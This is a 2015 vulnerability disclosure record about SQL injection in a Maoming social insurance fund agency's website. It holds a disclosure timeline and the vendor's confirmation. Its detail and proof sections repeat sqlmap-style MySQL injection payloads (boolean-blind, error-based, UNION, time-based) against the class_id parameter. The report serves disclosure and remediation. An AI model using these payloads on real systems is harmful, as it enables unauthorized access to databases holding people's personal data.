wybug_title: 广东省某市社会保险基金管理局存在注入，泄露数据库及后台
wybug_corp: 茂名市社会保险基金管理局
wybug_status: 已交由第三方合作机构(广东省信息安全测评中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-02-03：	细节已通知厂商并且等待厂商处理中									2015-02-06：	厂商已经确认，细节仅向厂商公开									2015-02-16：	细节向核心白帽子及相关领域专家公开									2015-02-26：	细节向普通白帽子公开									2015-03-08：	细节向实习白帽子公开									2015-03-20：	细节向公众公开  简要描述： 广东省某市社会保险基金管理局存在注入，泄露数据库及后台 详细说明：  


Place: GETParameter: class_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: class_id=65 AND 4292=4292    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: class_id=65 AND (SELECT 3306 FROM(SELECT COUNT(*),CONCAT(0x7179727071,(SELECT (CASE WHEN (3306=3306) THEN 1 ELSE 0 END)),0x7174756271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: class_id=-8614 UNION ALL SELECT NULL,NULL,CONCAT(0x7179727071,0x54496f416a4c7668716d,0x7174756271),NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: class_id=65 AND SLEEP(5)














   漏洞证明：  


Place: GETParameter: class_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: class_id=65 AND 4292=4292    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: class_id=65 AND (SELECT 3306 FROM(SELECT COUNT(*),CONCAT(0x7179727071,(SELECT (CASE WHEN (3306=3306) THEN 1 ELSE 0 END)),0x7174756271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: class_id=-8614 UNION ALL SELECT NULL,NULL,CONCAT(0x7179727071,0x54496f416a4c7668716d,0x7174756271),NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: class_id=65 AND SLEEP(5)

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-02-06 10:17 厂商回复： 非常感谢您的报告。报告中的问题已确认并复现.影响的数据：中攻击成本：低造成影响：中综合评级为：中，rank：8正在联系相关网站管理单位处置。 最新状态： 暂无
